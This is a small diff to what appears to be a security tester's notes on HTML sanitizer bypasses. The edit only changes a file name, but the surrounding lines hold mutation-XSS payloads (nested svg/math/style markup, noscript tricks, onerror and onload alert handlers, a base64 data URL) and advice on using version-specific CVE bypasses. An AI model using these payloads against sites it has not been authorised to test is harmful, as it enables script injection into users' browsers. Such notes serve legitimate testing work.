@@ -26,7 +26,7 @@ browser re-parses sanitized output into something executable:
 <form><math><mtext></form><form><mglyph><svg><mtext><style><path id="</style><img onerror=... src>">
 <noscript><p title="</noscript><img src=x onerror=...>">
 ```
-Also test: sanitizer version (retire.js/libraries.json), `svg`/`mathml` namespaces, nested
+Also test: sanitizer version (retire.js/libraries.jsonl), `svg`/`mathml` namespaces, nested
 `style`/`template`, and known-CVE bypasses for the specific sanitizer + version in use.
 
 ## Store-side gotchas
@@ -79,7 +79,7 @@ data:text/html;base64,PHN2ZyBvbmxvYWQ9YWxlcnQoZG9jdW1lbnQuZG9tYWluKT4=
 <svg></p><title><a id="</title><img src=x onerror=alert(document.domain)>">
 ```
 ### Config / version pivots
-- Fingerprint the sanitizer + version (retire.js / libraries.json / bundle strings). Bypass classes are
+- Fingerprint the sanitizer + version (retire.js / libraries.jsonl / bundle strings). Bypass classes are
   tied to specific minor versions — a vector that fires on an old build is patched in a newer one; confirm
   against the live build.
 - Test store-side and render-side filters independently (double-decoding: stored encoded, rendered decoded).
